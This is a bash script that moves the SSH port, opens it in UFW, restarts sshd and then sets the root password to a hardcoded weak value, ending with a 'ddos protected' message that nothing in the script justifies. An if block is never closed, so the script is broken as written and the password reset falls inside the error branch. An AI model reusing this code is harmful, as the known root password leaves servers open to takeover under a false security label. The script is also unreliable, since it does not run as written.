#!/bin/bash

# Ensure the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

# Variables
NEW_PORT=65
OLD_PORT=28
NEW_PASSWORD="kauya"

# Allow the new SSH port in the firewall
ufw allow $NEW_PORT
if [ $? -ne 0 ]; then
  echo "Failed to allow port $NEW_PORT in UFW. Exiting."
  exit 1
fi

# Update the SSH configuration to use the new port
SSH_CONFIG="/etc/ssh/sshd_config"
sed -i.bak "/^Port $OLD_PORT/c\Port $NEW_PORT" $SSH_CONFIG
if [ $? -ne 0 ]; then
  echo "Failed to update SSH port in $SSH_CONFIG. Exiting."
  exit 1
fi

# Restart the SSH service
systemctl restart sshd
if [ $? -ne 0 ]; then
  echo "Failed to restart SSH service. Reverting changes."
  mv ${SSH_CONFIG}.bak $SSH_CONFIG
  systemctl restart sshd
  exit 1

# Reset the root passworord
echo -e "$NEW_PASSWORD\n$NEW_PASSWORD" | passwd root
if [ $? -ne 0 ]; then
  echo "Failed to reset the root password. Exiting."
  exit 1
fi

# Confirm success
echo "ddos protected'."
exit 0
